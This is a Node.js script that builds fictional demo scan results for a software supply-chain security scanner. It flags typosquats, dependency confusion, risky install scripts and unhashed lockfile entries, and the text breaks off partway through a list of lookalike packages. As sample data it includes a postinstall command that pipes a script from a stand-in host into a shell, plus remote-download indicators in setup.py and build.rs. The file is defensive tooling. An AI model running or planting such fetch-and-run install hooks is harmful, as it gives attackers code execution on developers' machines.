#!/usr/bin/env node
/**
 * Generates web/src/data/demo-scan.json — a realistic, deterministic ScanResult that
 * matches src/types/scan.ts. It is the OFFLINE FALLBACK bundle; the lead overwrites it
 * with the real `GET /api/demo` output later. UI code must not depend on exact contents.
 * All malicious-looking names/maintainers are synthetic and fictional.
 *
 *   node scripts/make-sample-scan.mjs
 */
import { writeFileSync, mkdirSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'

const here = dirname(fileURLToPath(import.meta.url))
const OUT = join(here, '..', 'src', 'data', 'demo-scan.json')
const NOW = new Date('2026-09-29T19:42:11Z')

// ---- seeded PRNG (mulberry32) -------------------------------------------------------
let seed = 0x5eed1234
const rnd = () => {
  seed |= 0; seed = (seed + 0x6d2b79f5) | 0
  let t = Math.imul(seed ^ (seed >>> 15), 1 | seed)
  t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t
  return ((t ^ (t >>> 14)) >>> 0) / 4294967296
}
const between = (a, b) => Math.floor(a + rnd() * (b - a + 1))
const daysAgo = (d) => new Date(NOW.getTime() - d * 86400000).toISOString()
const hash = (n) => 'sha512-' + Buffer.from(Array.from({ length: 48 }, (_, i) => Math.floor(rnd() * 256) ^ (n.length + i))).toString('base64')

const REG = { npm: 'registry.npmjs.org', pypi: 'pypi.org', go: 'proxy.golang.org', rust: 'crates.io' }
const FILE = { npm: 'package-lock.json', pypi: 'requirements.txt', go: 'go.mod', rust: 'Cargo.lock' }

// ---- package catalogue --------------------------------------------------------------
// [name, version, dev?, options]
const P = {
  npm: [
    ['express', '4.19.2'], ['react', '18.3.1'], ['react-dom', '18.3.1'], ['lodash', '4.17.21'], ['axios', '1.7.2'],
    ['moment', '2.30.1', false, { noIntegrity: true }], ['underscore', '1.13.6', false, { noIntegrity: true }], ['webpack', '5.92.1', true],
    ['esbuild', '0.21.5', true, { scripts: { postinstall: 'node install.js' } }], ['typescript', '5.5.3', true], ['eslint', '9.6.0', true],
    ['prettier', '3.3.2', true], ['jest', '29.7.0', true], ['ts-node', '10.9.2', true], ['dotenv', '16.4.5'], ['cors', '2.8.5'],
    ['helmet', '7.1.0'], ['jsonwebtoken', '9.0.2'], ['bcrypt', '5.1.1', false, { scripts: { install: 'node-pre-gyp install --fallback-to-build' } }],
    ['pg', '8.12.0'], ['knex', '3.1.0'], ['redis', '4.6.14'], ['uuid', '10.0.0'], ['zod', '3.23.8'], ['winston', '3.13.1'],
    ['socket.io', '4.7.5'], ['body-parser', '1.20.2'], ['cookie-parser', '1.4.6'], ['debug', '4.3.5'], ['chalk', '5.3.0'],
    ['commander', '12.1.0'], ['glob', '10.4.2'], ['semver', '7.6.2'], ['yargs', '17.7.2'], ['minimist', '1.2.8'],
    ['puppeteer', '22.12.1', true, { scripts: { postinstall: 'node install.mjs' } }], ['sharp', '0.33.4', false, { scripts: { install: 'node install/check' } }],
    ['core-js', '3.37.1', false, { scripts: { postinstall: 'node -e "try{require(\'./postinstall\')}catch(e){}"' } }],
    ['cross-env', '7.0.3', true], ['node-fetch', '3.3.2'], ['jquery-ui', '1.13.3', false, { noIntegrity: true }],
    // internal-looking / suspicious
    ['@acme/internal-utils', '2.4.0', false, { internal: ['scope @acme matches organisation prefix', 'name contains "internal"'], resolution: 'range', spec: '^2.4.0', notFound: true }],
    ['@acme/auth-client', '1.9.2', false, { internal: ['scope @acme matches organisation prefix'], notFound: true, privateReg: 'npm.acme.dev' }],
    ['@acme/ui-kit', '5.1.0', false, { internal: ['scope @acme matches organisation prefix'], notFound: true, privateReg: 'npm.acme.dev', http: true }],
    ['crossenv', '6.1.1', false, {}],
    ['lodahs', '4.17.21', false, {}],
    ['expres', '4.17.3', false, {}],
    ['left-padder', '1.0.3', false, { scripts: { postinstall: 'curl -s https://cdn-telemetry.example.invalid/i.sh | sh' } }],
    ['stylelint-plus-config', '3.2.0', true, { scripts: { postinstall: 'node scripts/setup.js' } }],
    ['legacy-charts', '0.8.4', false, { vcs: 'git+https://github.com/example-org/legacy-charts.git#a41c9e0', noIntegrity: true }],
    ['colours', '1.4.0', false, {}],
  ],
  pypi: [
    ['requests', '2.31.0'], ['urllib3', '2.2.2'], ['certifi', '2024.6.2'], ['idna', '3.7'], ['charset-normalizer', '3.3.2'],
    ['flask', '3.0.3'], ['werkzeug', '3.0.3'], ['jinja2', '3.1.4'], ['markupsafe', '2.1.5'], ['click', '8.1.7'],
    ['itsdangerous', '2.2.0'], ['sqlalchemy', '2.0.31'], ['psycopg2-binary', '2.9.9', false, { noIntegrity: true }], ['alembic', '1.13.2'],
    ['pydantic', '2.7.4'], ['fastapi', '0.111.0'], ['uvicorn', '0.30.1'], ['starlette', '0.37.2'], ['gunicorn', '22.0.0', false, { noIntegrity: true }],
    ['celery', '5.4.0'], ['redis', '5.0.7'], ['boto3', '1.34.131'], ['botocore', '1.34.131'], ['numpy', '2.0.0'], ['pandas', '2.2.2'],
    ['pyyaml', '6.0.1'], ['cryptography', '42.0.8'], ['pyjwt', '2.8.0'], ['flask-cors', '4.0.1', false, { noIntegrity: true }],
    ['pytest', '8.2.2', true], ['httpx', '0.27.0'], ['python-dotenv', '1.0.1'],
    ['requets', '2.31.1', false, { scripts: { install: 'python setup.py install (network fetch in setup.py)' } }],
    ['python-requests', '0.0.1', false, {}],
    ['acme-billing-core', '3.2.0', false, { internal: ['prefix "acme-" matches organisation', 'name contains "core"'], resolution: 'range', spec: '>=3.1,<4', notFound: true, mixedIndex: true }],
    ['acme-telemetry', '1.4.2', false, { internal: ['prefix "acme-" matches organisation'], notFound: true, noIntegrity: true }],
    ['pytest-helpers-ng', '0.4.2', true, { scripts: { install: 'setup.py: urllib.request.urlopen(...)' } }],
    ['pycrypto-legacy', '2.6.2', false, { deprecated: true }],
  ],
  go: [
    ['github.com/gin-gonic/gin', 'v1.10.0'], ['github.com/gorilla/mux', 'v1.8.1'], ['github.com/stretchr/testify', 'v1.9.0', true],
    ['github.com/spf13/cobra', 'v1.8.1'], ['github.com/spf13/viper', 'v1.19.0'], ['go.uber.org/zap', 'v1.27.0'],
    ['github.com/jackc/pgx/v5', 'v5.6.0'], ['github.com/redis/go-redis/v9', 'v9.5.3'], ['github.com/golang-jwt/jwt/v5', 'v5.2.1'],
    ['google.golang.org/grpc', 'v1.64.1'], ['google.golang.org/protobuf', 'v1.34.2'], ['golang.org/x/net', 'v0.26.0'],
    ['golang.org/x/crypto', 'v0.24.0'], ['golang.org/x/sys', 'v0.21.0'], ['golang.org/x/text', 'v0.16.0'],
    ['golang.org/x/exp', 'v0.0.0-20240613232115-7f521ea00fb8', false, { pseudo: true }],
    ['github.com/prometheus/client_golang', 'v1.19.1'], ['github.com/google/uuid', 'v1.6.0'], ['github.com/rs/zerolog', 'v1.33.0'],
    ['github.com/gorrila/mux', 'v1.8.1', false, {}],
    ['internal.acme.dev/platform/authkit', 'v0.9.3', false, { internal: ['host internal.acme.dev is a private domain', 'path contains "platform"'], notFound: true, resolution: 'range' }],
    ['github.com/acme-corp/shared', 'v0.0.0', false, { internal: ['org acme-corp matches organisation'], local: '../shared', notFound: true }],
  ],
  rust: [
    ['serde', '1.0.203'], ['serde_json', '1.0.117'], ['tokio', '1.38.0'], ['hyper', '1.3.1'], ['reqwest', '0.12.4'], ['axum', '0.7.5'],
    ['tracing', '0.1.40'], ['clap', '4.5.7'], ['anyhow', '1.0.86'], ['thiserror', '1.0.61'], ['rand', '0.8.5'], ['regex', '1.10.5'],
    ['openssl-sys', '0.9.102', false, { build: true }], ['sqlx', '0.7.4'], ['chrono', '0.4.38'], ['uuid', '1.9.1'], ['bytes', '1.6.0'],
    ['serde-jsonn', '1.0.1', false, {}], ['tokio-utils-x', '0.2.1', false, { build: true }],
    ['internal-cache', '0.3.0', false, { internal: ['name contains "internal"'], vcs: 'git+ssh://git@git.acme.dev/platform/internal-cache#8b2d7f1', notFound: true }],
  ],
}

// dependency tree (parent -> children by name). Anything not listed as a child is a direct dep.
const CHILDREN = {
  express: ['body-parser', 'cookie-parser', 'debug', 'cors'], 'react-dom': ['react'], jest: ['glob', 'minimist'], webpack: ['glob', 'semver'],
  winston: ['chalk'], knex: ['pg', 'debug'], yargs: ['minimist'], eslint: ['chalk', 'debug', 'semver'], puppeteer: ['debug', 'yargs'],
  'socket.io': ['debug', 'uuid'], 'ts-node': ['typescript', 'semver'], '@acme/auth-client': ['jsonwebtoken', 'uuid'], '@acme/ui-kit': ['react', 'react-dom'],
  '@acme/internal-utils': ['lodash', 'zod'], stylelint_dummy: [],
  requests: ['urllib3', 'certifi', 'idna', 'charset-normalizer'], flask: ['werkzeug', 'jinja2', 'click', 'itsdangerous'], jinja2: ['markupsafe'],
  werkzeug: ['markupsafe'], sqlalchemy: ['alembic'], fastapi: ['starlette', 'pydantic'], uvicorn: ['click'], celery: ['redis', 'click'],
  boto3: ['botocore'], botocore: ['urllib3'], pandas: ['numpy'], httpx: ['certifi', 'idna'], 'acme-billing-core': ['requests', 'pyjwt', 'cryptography'],
  'acme-telemetry': ['httpx'], requets: ['urllib3'],
  'github.com/gin-gonic/gin': ['golang.org/x/net', 'golang.org/x/sys'], 'github.com/spf13/cobra': ['golang.org/x/text'], 'github.com/spf13/viper': ['golang.org/x/text', 'golang.org/x/sys'],
  'google.golang.org/grpc': ['google.golang.org/protobuf', 'golang.org/x/net'], 'internal.acme.dev/platform/authkit': ['github.com/golang-jwt/jwt/v5', 'golang.org/x/crypto'],
  'github.com/jackc/pgx/v5': ['golang.org/x/crypto', 'golang.org/x/text'], 'github.com/gorrila/mux': [], 'github.com/acme-corp/shared': ['go.uber.org/zap'],
  reqwest: ['hyper', 'tokio', 'bytes', 'serde'], axum: ['hyper', 'tokio', 'tracing', 'serde_json'], hyper: ['bytes', 'tokio'], sqlx: ['tokio', 'chrono', 'uuid'],
  clap: [], 'internal-cache': ['serde', 'tokio'], 'tokio-utils-x': ['tokio'], 'serde-jsonn': ['serde_json'], 'openssl-sys': [],
}

// ---- build packages -----------------------------------------------------------------
const packages = []
const byKey = new Map() // `${eco}:${name}` -> pkg
for (const eco of Object.keys(P)) {
  for (const [name, version, dev = false, o = {}] of P[eco]) {
    const id = `${eco}:${name}@${version}`
    const internal = !!o.internal
    const pkg = {
      id, name, version, spec: o.spec ?? (eco === 'npm' ? version : eco === 'pypi' ? `==${version}` : version), ecosystem: eco,
      registry: o.privateReg ? o.privateReg : o.mixedIndex ? 'pypi.org' : REG[eco],
      registry_source: o.http ? 'http://npm.acme.dev/' : o.privateReg ? `https://${o.privateReg}/` : o.mixedIndex ? 'extra-index-url: https://pypi.acme.dev/simple' : null,
      resolution: o.resolution ?? (o.vcs ? 'vcs' : o.local ? 'local' : o.noIntegrity ? 'exact' : eco === 'npm' || eco === 'go' ? 'hashed' : 'exact'),
      integrity: o.noIntegrity || o.vcs || o.local || o.notFound ? null : eco === 'npm' ? hash(name) : eco === 'go' ? 'h1:' + hash(name).slice(7, 51) : eco === 'rust' ? rnd().toString(16).slice(2).padEnd(64, '0') : 'sha256:' + rnd().toString(16).slice(2).padEnd(64, '0'),
      dev, direct: true, depth: 0, dependencies: [], dependents_count: 0,
      source_file: FILE[eco], public_status: o.notFound ? 'not_found' : 'registered', internal_looking: internal,
      internal_reasons: o.internal ?? [], metadata: null, risk_score: 0, severity: 'info', status: 'clean', finding_ids: [],
      confusion: false, typosquat: false, metadata_flag: false, registry_exposure: false, _o: o,
    }
    packages.push(pkg); byKey.set(`${eco}:${name}`, pkg)
  }
}
const find = (name) => packages.find((p) => p.name === name)

// edges / depth
const edges = []
for (const [parent, kids] of Object.entries(CHILDREN)) {
  const pp = packages.filter((p) => p.name === parent)
  for (const p of pp) for (const k of kids) {
    const c = packages.find((x) => x.name === k && x.ecosystem === p.ecosystem)
    if (!c || c.id === p.id) continue
    p.dependencies.push(c.id); c.direct = false; c.dependents_count++
    edges.push({ source: p.id, target: c.id, kind: c.dev ? 'dev' : 'depends' })
  }
}
for (const eco of Object.keys(P)) {
  const level = packages.filter((p) => p.ecosystem === eco && p.direct)
  level.forEach((p) => (p.depth = 1))
  let frontier = level
  while (frontier.length) {
    const next = []
    for (const p of frontier) for (const cid of p.dependencies) {
      const c = packages.find((x) => x.id === cid)
      if (c.depth === 0 || c.depth > p.depth + 1) { c.depth = p.depth + 1; next.push(c) }
    }
    frontier = next
  }
  packages.filter((p) => p.ecosystem === eco && p.depth === 0).forEach((p) => (p.depth = 1))
}

// metadata
const WELL_KNOWN = new Set(['express', 'react', 'lodash', 'requests', 'numpy', 'serde', 'tokio', 'boto3', 'pandas', 'axios', 'flask', 'fastapi'])
for (const p of packages) {
  const o = p._o
  if (p.public_status === 'not_found') { p.metadata = null; continue }
  const wk = WELL_KNOWN.has(p.name)
  const suspicious = ['crossenv', 'lodahs', 'expres', 'left-padder', 'stylelint-plus-config', 'requets', 'python-requests', 'pytest-helpers-ng', 'github.com/gorrila/mux', 'serde-jsonn', 'tokio-utils-x', 'colours'].includes(p.name)
  const age = suspicious ? between(6, 140) : between(700, 3600)
  p.metadata = {
    registered_at: daysAgo(age), latest_version: p.version, latest_published_at: daysAgo(suspicious ? between(1, 30) : between(5, 260)),
    versions_count: suspicious ? between(2, 9) : between(18, 420),
    weekly_downloads: suspicious ? between(90, 4800) : wk ? between(9_000_000, 60_000_000) : between(150_000, 6_000_000),
    maintainers: suspicious ? [['pkg-hollis', 'dm-vartek', 'n0rthwind-dev', 'kirin_labs', 'axl-maint'][between(0, 4)]] : ['core-team', 'release-bot'].slice(0, between(1, 2)),
    maintainer_changes: 0,
    install_scripts: { preinstall: null, install: o.scripts?.install ?? null, postinstall: o.scripts?.postinstall ?? null, prepare: null, build_script: !!o.build },
    network_indicators: [], repository_url: suspicious ? null : `https://github.com/${p.name.replace(/^@/, '').split('/')[0]}/${p.name.split('/').pop()}`,
    description: suspicious ? null : `${p.name} — maintained package`, deprecated: !!o.deprecated, version_gap: null, age_days: age,
  }
}
const meta = (n) => find(n).metadata
Object.assign(meta('left-padder'), { maintainer_changes: 0, network_indicators: ['https://cdn-telemetry.example.invalid/i.sh'], weekly_downloads: 214, age_days: 9, registered_at: daysAgo(9), versions_count: 3 })
Object.assign(meta('stylelint-plus-config'), { maintainer_changes: 2, weekly_downloads: 1840, age_days: 61, registered_at: daysAgo(61), maintainers: ['axl-maint', 'n0rthwind-dev'] })
Object.assign(meta('pytest-helpers-ng'), { maintainer_changes: 2, network_indicators: ['urllib.request.urlopen(http://198.51.100.24/stage)'], weekly_downloads: 460, age_days: 23, registered_at: daysAgo(23) })
Object.assign(meta('tokio-utils-x'), { network_indicators: ['build.rs: reqwest::blocking::get("https://updates.example.invalid/bin")'], weekly_downloads: 312, age_days: 17, registered_at: daysAgo(17) })
Object.assign(meta('requets'), { weekly_downloads: 1120, age_days: 44, registered_at: daysAgo(44), maintainers: ['dm-vartek'], network_indicators: ['setup.py fetches https://files.example.invalid/req.zip'] })
Object.assign(meta('crossenv'), { weekly_downloads: 3900, age_days: 96, maintainers: ['pkg-hollis'] })
Object.assign(meta('pycrypto-legacy'), { weekly_downloads: 5200, age_days: 2700, deprecated: true, latest_published_at: daysAgo(2100), maintainers: ['legacy-maint'] })
Object.assign(meta('openssl-sys'), { weekly_downloads: 4_200_000 })
Object.assign(meta('esbuild'), { weekly_downloads: 38_000_000 })

// ---- findings -----------------------------------------------------------------------
const findings = []
let fno = 0
const ev = (label, value, mono = true) => ({ label, value: String(value), mono })
function addFinding(pkgName, f) {
  const p = find(pkgName)
  fno++
  const fid = `F-${String(fno).padStart(3, '0')}`
  const out = {
    id: fid, package_id: p.id, package: p.name, version: p.version, ecosystem: p.ecosystem,
    category: f.category, title: f.title, severity: f.severity, risk_score: f.score, confidence: f.confidence,
    summary: f.summary, why_flagged: f.why, attack_vector: f.vector, evidence: f.evidence, drivers: f.drivers, remediation: f.fix,
    resolution_type: p.resolution, dependency_source: p.source_file, registry: p.registry, detected_at: NOW.toISOString(),
    public_status: p.public_status, related_package: f.related ?? null, rule_id: f.rule,
  }
  findings.push(out); p.finding_ids.push(fid)
  if (f.category === 'dependency_confusion') p.confusion = true
  if (f.category === 'typosquatting') p.typosquat = true
  if (f.category === 'suspicious_metadata') p.metadata_flag = true
  if (f.category === 'registry_exposure') p.registry_exposure = true
}
const drivers = (...a) => a.map(([label, points, detail]) => ({ label, points, detail }))
const fix = (...a) => a.map(([title, detail]) => ({ title, detail }))

// Dependency confusion (3)
addFinding('@acme/internal-utils', {
  category: 'dependency_confusion', severity: 'critical', score: 92, confidence: 0.93, rule: 'RPL-DC-001',
  title: 'Internal-looking package resolved by range with no public registration',
  summary: 'The scope @acme is unclaimed on the public npm registry, and the ^2.4.0 range would accept any higher version an attacker publishes.',
  why: 'The name matches your organisation prefix, the package does not exist on registry.npmjs.org, and package-lock.json pins it with a semver range on the default registry.',
  vector: 'Attacker registers @acme/internal-utils publicly with a very high version number; installs without a scoped registry mapping fetch the attacker copy.',
  evidence: [ev('Registry lookup', 'registry.npmjs.org → 404 Not Found'), ev('Version spec', '^2.4.0'), ev('Scope claimed publicly', 'no', false), ev('Internal indicators', 'scope @acme · "internal" in name', false)],
  drivers: drivers(['Unregistered public name', 34, 'Name is free to claim'], ['Range-resolved version', 24, '^2.4.0 accepts higher versions'], ['Internal-looking name', 20, 'Matches org prefix'], ['Default registry', 14, 'No scoped registry override']),
  fix: fix(['Claim the scope', 'Register the @acme scope on npm to block squatting, even if you never publish there.'], ['Map the scope', 'Add `@acme:registry=https://npm.acme.dev/` to .npmrc so it never resolves publicly.'], ['Pin exactly', 'Replace ^2.4.0 with 2.4.0 and enforce integrity hashes.']),
})
addFinding('acme-billing-core', {
  category: 'dependency_confusion', severity: 'critical', score: 88, confidence: 0.9, rule: 'RPL-DC-002',
  title: 'Private index package also resolvable from the public index',
  summary: 'pip is configured with --extra-index-url, so a higher version of acme-billing-core published to PyPI will win.',
  why: 'requirements.txt combines an internal index with pypi.org and pins acme-billing-core with a range. The name is not registered on PyPI today.',
  vector: 'Attacker publishes acme-billing-core 99.0.0 on PyPI; pip picks the highest version across both indexes.',
  evidence: [ev('PyPI lookup', 'pypi.org/pypi/acme-billing-core → 404'), ev('Index config', 'extra-index-url: https://pypi.acme.dev/simple'), ev('Version spec', '>=3.1,<4'), ev('Upper bound', '<4 (attacker can publish 3.99)', false)],
  drivers: drivers(['Mixed index', 32, 'Public and private index merged'], ['Unregistered public name', 30, 'Free to claim'], ['Range spec', 16, '>=3.1,<4'], ['Internal-looking name', 10, 'acme- prefix']),
  fix: fix(['Use --index-url', 'Point pip at a single index that proxies PyPI; drop --extra-index-url.'], ['Reserve the name', 'Publish an empty placeholder to PyPI under your control.'], ['Hash-pin', 'Use pip --require-hashes with exact versions.']),
})
addFinding('internal.acme.dev/platform/authkit', {
  category: 'dependency_confusion', severity: 'high', score: 71, confidence: 0.78, rule: 'RPL-DC-003',
  title: 'Private module path not covered by GOPRIVATE',
  summary: 'The module lives on a private host, but nothing in go.mod stops the public proxy from being asked about it first.',
  why: 'proxy.golang.org returns 404 for this path, and no GOPRIVATE or GONOPROXY setting is recorded alongside the lockfile.',
  vector: 'Module path lookups leak to the public proxy and checksum database, exposing internal names and inviting path squatting on lookalike hosts.',
  evidence: [ev('Proxy lookup', 'proxy.golang.org → 410 Gone'), ev('Module host', 'internal.acme.dev', true), ev('GOPRIVATE', 'not set', false)],
  drivers: drivers(['Private host, public proxy', 38, 'Lookups leave the network'], ['Internal-looking path', 20, 'internal. subdomain'], ['Unpinned checksum', 13, 'No go.sum line found']),
  fix: fix(['Set GOPRIVATE', 'export GOPRIVATE=internal.acme.dev/* so lookups never leave the organisation.'], ['Vendor or proxy', 'Serve modules from an internal Athens/Artifactory proxy.']),
})

// Typosquatting (8)
const TYPO = [
  ['requets', 'critical', 94, 0.96, 'requests', 'One missing letter from requests (52M weekly downloads)', 'omission', 1120, 44],
  ['crossenv', 'high', 82, 0.9, 'cross-env', 'Separator removed from cross-env', 'separator removal', 3900, 96],
  ['lodahs', 'high', 79, 0.88, 'lodash', 'Two transposed letters from lodash', 'transposition', 2100, 31],
  ['github.com/gorrila/mux', 'high', 76, 0.86, 'github.com/gorilla/mux', 'Duplicated letter in the org name gorilla', 'duplication', 640, 58],
  ['python-requests', 'medium', 58, 0.7, 'requests', 'Prefix variant of requests, unrelated maintainer', 'prefix', 5100, 210],
  ['colours', 'medium', 52, 0.62, 'colors', 'Spelling variant of colors', 'spelling', 8800, 320],
  ['expres', 'medium', 55, 0.66, 'express', 'One missing letter from express', 'omission', 1450, 77],
  ['serde-jsonn', 'medium', 60, 0.72, 'serde_json', 'Doubled n and separator swap from serde_json', 'duplication+separator', 280, 19],
]
for (const [name, sev, score, conf, original, s, mutation, dl, age] of TYPO) {
  const p = find(name)
  addFinding(name, {
    category: 'typosquatting', severity: sev, score, confidence: conf, rule: 'RPL-TS-001', related: original,
    title: `Lookalike of ${original}`,
    summary: `${s}. Registered ${age} days ago with ${dl.toLocaleString('en-US')} weekly downloads against the original’s millions.`,
    why: `Edit distance to ${original} is small, the name is registered, and its age and download profile are far below the original.`,
    vector: 'Developer typo or copy-paste from a forum installs the lookalike; its install hook or import-time code runs with the developer’s privileges.',
    evidence: [ev('Original', original), ev('Mutation', mutation, false), ev('Weekly downloads', dl.toLocaleString('en-US')), ev('Registered', `${age} days ago`, false), ev('Maintainer', p.metadata?.maintainers?.[0] ?? 'unknown')],
    drivers: drivers(['Name similarity', Math.round(score * 0.4), `Mutation: ${mutation}`], ['Download gap', Math.round(score * 0.25), 'Original is orders of magnitude larger'], ['Registration age', Math.round(score * 0.2), `${age} days old`], ['Maintainer unrelated', Math.round(score * 0.15), 'Not an org of the original']),
    fix: fix(['Replace the dependency', `Swap ${name} for ${original} and re-lock.`], ['Review recent installs', 'Check CI logs and developer machines that resolved the lookalike.']),
  })
}

// Suspicious metadata (14)
const MD = [
  ['left-padder', 'high', 84, 0.92, 'Post-install script pipes a remote file to a shell', ['postinstall: curl … | sh', 'Registered 9 days ago', '214 weekly downloads']],
  ['pytest-helpers-ng', 'high', 78, 0.85, 'setup.py reaches out to a raw IP and the maintainer changed twice', ['Network call in setup.py', '2 maintainer changes in 30 days', '460 weekly downloads']],
  ['tokio-utils-x', 'high', 74, 0.82, 'build.rs downloads a binary at compile time', ['build.rs uses reqwest::blocking::get', 'Registered 17 days ago', '312 weekly downloads']],
  ['stylelint-plus-config', 'high', 68, 0.75, 'Maintainer set changed twice and a post-install script appeared', ['2 maintainer changes', 'postinstall: node scripts/setup.js']],
  ['esbuild', 'medium', 44, 0.6, 'Runs an install script that downloads a platform binary', ['postinstall: node install.js']],
  ['puppeteer', 'medium', 42, 0.6, 'Post-install downloads a browser build', ['postinstall: node install.mjs']],
  ['sharp', 'medium', 40, 0.58, 'Install script checks for native libraries', ['install: node install/check']],
  ['core-js', 'medium', 36, 0.55, 'Post-install prints sponsorship message via node -e', ['postinstall: node -e …']],
  ['bcrypt', 'medium', 45, 0.62, 'Native addon compiled on install', ['install: node-pre-gyp install --fallback-to-build']],
  ['pycrypto-legacy', 'medium', 47, 0.7, 'Deprecated, unmaintained cryptography library', ['deprecated: true', 'Last release 2100 days ago']],
  ['openssl-sys', 'medium', 34, 0.5, 'Build script links against system OpenSSL', ['build.rs present']],
  ['github.com/acme-corp/shared', 'medium', 38, 0.55, 'Local path replace makes the source unverifiable', ['replace ../shared']],
  ['internal-cache', 'medium', 41, 0.6, 'No public registry record and sourced from a private git host', ['source: git+ssh://git.acme.dev']],
  ['requets', 'medium', 55, 0.7, 'Install step fetches an archive from an unrelated host', ['setup.py fetches https://files.example.invalid/req.zip']],
]
for (const [name, sev, score, conf, title, lines] of MD) {
  const p = find(name)
  addFinding(name, {
    category: 'suspicious_metadata', severity: sev, score, confidence: conf, rule: sev === 'high' ? 'RPL-MD-002' : 'RPL-MD-001', title,
    summary: `${title}. ${lines[0]}.`,
    why: 'Registry metadata contains signals commonly associated with install-time code execution or fresh, low-reputation publishing.',
    vector: 'Code runs automatically on install or build, before any review of the package contents.',
    evidence: lines.map((l, i) => ev(i === 0 ? 'Primary signal' : `Signal ${i + 1}`, l)),
    drivers: drivers(['Install-time execution', Math.round(score * 0.45), 'Script runs on install'], ['Reputation', Math.round(score * 0.3), 'Age / downloads / maintainers'], ['Network reachability', Math.round(score * 0.25), 'Fetches remote content']),
    fix: fix(['Review the script', 'Read the install script or build.rs before allowing it in CI.'], ['Disable scripts in CI', p.ecosystem === 'npm' ? 'Use `npm ci --ignore-scripts` and allow-list needed packages.' : 'Prefer wheels / vendored builds and review the build step.']),
  })
}

// Registry exposure (12)
const EX = [
  ['@acme/ui-kit', 'medium', 46, 0.95, 'Resolved over plain HTTP', ['Registry: http://npm.acme.dev/', 'No TLS, tarball can be tampered in transit']],
  ['legacy-charts', 'medium', 43, 0.9, 'Installed from an unpinned VCS ref', ['git+https://github.com/example-org/legacy-charts.git#a41c9e0']],
  ['moment', 'low', 22, 0.95, 'No integrity hash recorded', ['integrity: missing']],
  ['underscore', 'low', 22, 0.95, 'No integrity hash recorded', ['integrity: missing']],
  ['jquery-ui', 'low', 21, 0.95, 'No integrity hash recorded', ['integrity: missing']],
  ['flask-cors', 'low', 24, 0.9, 'Pinned without a hash', ['requirements.txt: flask-cors==4.0.1 (no --hash)']],
  ['gunicorn', 'low', 24, 0.9, 'Pinned without a hash', ['requirements.txt: gunicorn==22.0.0 (no --hash)']],
  ['psycopg2-binary', 'low', 24, 0.9, 'Pinned without a hash', ['requirements.txt: psycopg2-binary==2.9.9 (no --hash)']],
  ['acme-telemetry', 'low', 26, 0.85, 'Internal package pinned without a hash', ['requirements.txt: acme-telemetry==1.4.2 (no --hash)']],
  ['github.com/acme-corp/shared', 'low', 27, 0.9, 'replace directive points to a local path', ['replace github.com/acme-corp/shared => ../shared']],
  ['golang.org/x/exp', 'low', 20, 0.8, 'Pseudo-version tracks an untagged commit', ['v0.0.0-20240613232115-7f521ea00fb8']],
  ['internal-cache', 'low', 25, 0.88, 'Cargo git dependency over SSH', ['git+ssh://git@git.acme.dev/platform/internal-cache#8b2d7f1']],
]
for (const [name, sev, score, conf, title, lines] of EX) {
  addFinding(name, {
    category: 'registry_exposure', severity: sev, score, confidence: conf, rule: 'RPL-RX-001', title,
    summary: `${title}. Tampering or substitution would not be detected on install.`,
    why: 'The lockfile entry lacks the guarantees (TLS, integrity hash, pinned revision) needed to prove the artefact is the one you reviewed.',
    vector: 'A network attacker or compromised mirror substitutes a modified artefact; nothing in the lockfile allows detection.',
    evidence: lines.map((l, i) => ev(i === 0 ? 'Lockfile entry' : 'Impact', l, i === 0)),
    drivers: drivers(['Missing integrity guarantee', Math.round(score * 0.6), 'No hash / TLS / pinned rev'], ['Blast radius', Math.round(score * 0.4), 'Runs in build & production']),
    fix: fix(['Enforce integrity', 'Regenerate the lockfile with hashes and fail CI when they are absent.'], ['Use HTTPS registries', 'Serve internal packages over TLS only.']),
  })
}

// ---- package scoring ----------------------------------------------------------------
const RANK = { critical: 4, high: 3, medium: 2, low: 1, info: 0 }
for (const p of packages) {
  const fs = findings.filter((f) => f.package_id === p.id)
  if (fs.length) {
    const top = fs.reduce((a, b) => (RANK[b.severity] > RANK[a.severity] || (b.severity === a.severity && b.risk_score > a.risk_score) ? b : a))
    p.severity = top.severity; p.risk_score = Math.min(100, top.risk_score + (fs.length - 1) * 3); p.status = 'flagged'
  } else {
    p.risk_score = p.public_status === 'not_found' ? 18 : between(0, 6)
    p.severity = 'info'; p.status = p.public_status === 'not_found' ? 'unverified' : 'clean'
  }
  delete p._o
}

// ---- lookalike groups ---------------------------------------------------------------
const cand = (name, mutation, sim, dist, registered, days, dl, maint, scripts, score, sev, drv) => ({
  name, mutation, similarity: sim, distance: dist, registered, registered_at: registered ? daysAgo(days) : null,
  weekly_downloads: registered ? dl : null, maintainers: registered ? maint : [], install_scripts: scripts, suspicion_score: score, severity: sev, drivers: drv,
})
const lookalikes = [
  {
    original: 'requests', original_package_id: 'pypi:requests@2.31.0', ecosystem: 'pypi', original_weekly_downloads: 52_400_000,
    candidates: [
      cand('requets', 'omission', 0.93, 1, true, 44, 1120, ['dm-vartek'], ['setup.py: fetches remote archive'], 94, 'critical', ['Present in lockfile', 'Install-time network call', 'Registered 44 days ago']),
      cand('requsets', 'transposition', 0.93, 1, true, 12, 380, ['n0rthwind-dev'], [], 71, 'high', ['Registered 12 days ago', 'No repository link']),
      cand('reqquests', 'duplication', 0.89, 1, false, 0, 0, [], [], 24, 'low', ['Unregistered — squattable']),
      cand('reqests', 'omission', 0.93, 1, false, 0, 0, [], [], 24, 'low', ['Unregistered — squattable']),
      cand('requ3sts', 'homoglyph', 0.89, 1, true, 31, 210, ['kirin_labs'], ['setup.py: os.system'], 77, 'high', ['Character substitution e → 3', 'Runs os.system at install']),
      cand('python-requests', 'prefix', 0.71, 7, true, 210, 5100, ['axl-maint'], [], 58, 'medium', ['Present in lockfile', 'Unrelated maintainer']),
      cand('python_requests', 'separator', 0.71, 7, false, 0, 0, [], [], 22, 'low', ['Unregistered — squattable']),
    ],
  },
  {
    original: 'lodash', original_package_id: 'npm:lodash@4.17.21', ecosystem: 'npm', original_weekly_downloads: 48_900_000,
    candidates: [
      cand('lodahs', 'transposition', 0.83, 1, true, 31, 2100, ['pkg-hollis'], [], 79, 'high', ['Present in lockfile', 'Two transposed letters']),
      cand('lodsh', 'omission', 0.83, 1, true, 88, 640, ['kirin_labs'], [], 48, 'medium', ['Registered 88 days ago']),
      cand('l0dash', 'homoglyph', 0.83, 1, false, 0, 0, [], [], 22, 'low', ['Unregistered — squattable']),
